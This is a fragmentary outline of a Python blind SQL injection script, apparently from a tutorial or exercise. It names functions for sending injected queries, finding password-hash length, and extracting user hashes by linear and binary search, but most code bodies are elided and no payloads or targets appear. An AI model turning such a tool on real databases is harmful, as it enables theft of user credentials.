...
def injected_query(payload):
    """Execute a SQL injection query and check response."""
...
def boolean_query(offset, user_id, character, operator=">"):
    """Perform a boolean-based blind SQL injection query."""
...
def password_length(user_id):
    """Determine the length of a user's password hash."""
    i = 0
    while True:
...
def extract_hash(charset, user_id, password_length):
    """Extract password hash character by character using linear search."""
    found = ""
...
def extract_hash_bst(charset, user_id, password_length):
    """Extract password hash using binary search tree algorithm for efficiency."""
    found = ""
...
def total_queries_taken():
    """Display and reset the total queries counter."""
    global total_queries
    ...
    while True:
        try:
            ...
            if not invalid_user(user_id):
                ...
                total_queries_taken()
                print("\t[-] User {} hash: {}".format(
                    user_id, extract_hash(charset, int(user_id), user_password_length)
                ))
                total_queries_taken()
                print("\t[-] User {} hash: {}".format(
                    user_id, extract_hash_bst(charset, int(user_id), user_password_length)
                ))
                total_queries_taken()
            else:
